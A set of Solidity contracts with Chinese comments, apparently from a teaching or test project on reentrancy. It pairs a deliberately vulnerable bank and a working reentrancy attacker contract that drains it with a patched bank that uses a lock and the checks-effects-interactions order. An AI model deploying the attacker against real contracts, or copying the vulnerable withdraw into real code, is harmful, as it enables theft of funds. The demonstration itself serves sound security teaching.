// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousBorrower {
    address public lendingPool;
    IERC20 public token;

    constructor(address _lendingPool, address _token) {
        lendingPool = _lendingPool;
        token = IERC20(_token);
    }

    // 恶意函数，尝试进行重入攻击
    function attack(uint256 amount) external {
        // 先存款
        token.approve(lendingPool, amount);
        (bool success, ) = lendingPool.call(
            abi.encodeWithSignature("deposit(uint256)", amount)
        );
        require(success, "Deposit failed");

        // 然后尝试借款并进行重入攻击
        (success, ) = lendingPool.call(
            abi.encodeWithSignature("borrow(uint256)", amount)
        );
        require(success, "Borrow failed");
    }

    // 添加一个 receive 函数来处理纯 ETH 转账
    receive() external payable {
        // 这个合约本不预期接收ETH，所以我们可以选择什么都不做，
        // 或者为了“恶意”，在这里也尝试重入
        // 但为了测试清晰，我们留空或revert
        // 留空意味着合约可以接受ETH（虽然在这个测试场景里用不到）
    }

    // 回退函数 - 尝试在借款过程中进行重入
    fallback() external payable {
        // 这里可以尝试进行重入攻击，但应该被ReentrancyGuard阻止
        (bool success, ) = lendingPool.call(
            abi.encodeWithSignature("borrow(uint256)", 1 ether)
        );
        if (success) {
            // 如果重入成功，继续尝试更多操作
        }
    }
}

contracts/ReentrancyAttack.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttack {
    IVulnerableBank public bank;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
    }

    // 攻击函数
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // 回退函数 - 重入攻击的入口点
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function stealFunds() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}

contracts/SecureBank.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureBank {
    mapping(address => uint) public balances;
    bool private locked;

    // 防重入锁修饰器
    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 修复后的取款函数 - 使用Checks-Effects-Interactions模式
    function withdraw() public noReentrant {
        uint amount = balances[msg.sender];
        require(amount > 0, "No balance to withdraw");

        // 先更新状态再外部调用（CEI模式）
        balances[msg.sender] = 0;

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contracts/Token.sol.content:
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract Token {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Mint(address indexed to, uint256 value);

    modifier onlyOwner() {
      require(msg.sender == owner, "Only owner can call this");
      _;
    }

    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _initialSupply) {
      name = _name;
      symbol = _symbol;
      decimals = _decimals;
      owner = msg.sender;
      mint(msg.sender, _initialSupply);

    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
      require(balanceOf[msg.sender] >= _value, "Insufficient balance");
      require(_to != address(0), "Invalid recipient");

      balanceOf[msg.sender] -= _value;
      balanceOf[_to] += _value;

      emit Transfer(msg.sender, _to, _value);
      return true;
    }

    function mint(address _to, uint256 _value) public onlyOwner {
      balanceOf[_to] += _value;
      totalSupply += _value;
      emit Mint(_to, _value);
      emit Transfer(address(0), _to, _value);
    }
}

contracts/VulnerableBank.sol.content:
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 有重入漏洞的取款函数 - 先转账后更新余额
    function withdraw() public {
        uint amount = balances[msg.sender];
        require(amount > 0, "No balance to withdraw");

        // 漏洞点：先外部调用再更新状态
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

